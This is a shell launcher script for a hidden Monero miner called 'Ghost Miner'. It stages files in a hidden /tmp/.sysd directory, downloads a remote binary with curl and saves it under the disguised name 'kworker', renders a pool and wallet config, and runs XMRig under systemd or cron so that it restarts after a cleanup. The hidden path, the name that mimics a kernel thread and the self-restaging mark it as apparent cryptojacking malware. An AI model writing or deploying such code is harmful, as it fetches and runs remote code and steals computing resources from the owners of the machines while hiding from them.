#!/bin/sh
# Ghost Miner launcher. Called by systemd (or by the cron fallback).
# Runs the miner in the foreground, politely, so the supervisor can restart it.

set -eu

SYSDIR="${SYSDIR:-/tmp/.sysd}"

# Pull in the constants (wallet, pool, tags...).
if [ -r "$SYSDIR/worker.env" ]; then . "$SYSDIR/worker.env"; fi

# Self-stage: covers a cleaned /tmp, or systemd starting before bootstrap finished.
if [ ! -x "$SYSDIR/kworker" ]; then
    mkdir -p "$SYSDIR"
    curl -fsSL "${PAYLOAD_URL:?}" -o "$SYSDIR/kworker"
    chmod 0755 "$SYSDIR/kworker"
fi
if [ ! -r "$SYSDIR/config.json" ]; then
    curl -fsSL "${CONFIG_URL:?}/config.json" -o "$SYSDIR/config.tmpl"
    sed -e "s|__URL__|${POOL:-}|g" \
        -e "s|__USER__|${WALLET:-}|g" \
        -e "s|__PASS__|${RIG_ID:-node}|g" \
        -e "s|__RIGID__|${RIG_ID:-node}|g" \
        -e "s|__TLS__|${TLS:-true}|g" \
        "$SYSDIR/config.tmpl" > "$SYSDIR/config.json"
fi

# Leave one core free unless told otherwise.
cpu=$(nproc 2>/dev/null || echo 2)
case "$cpu" in ''|*[!0-9]*) cpu=2 ;; esac
THREADS="${THREADS:-$(( cpu > 1 ? cpu - 1 : 1 ))}"

# wallet, pool and TLS all come from config.json (rendered from worker.env).
# We deliberately do NOT pass -o/-u/-p here: a CLI -o makes XMRig build a fresh
# pool from the command line and silently drop the config's "tls": true, which
# then gets reset by a TLS port.
exec "$SYSDIR/kworker" \
    -c "$SYSDIR/config.json" \
    -t "$THREADS" \
    --cpu-priority 0 \
    --no-color
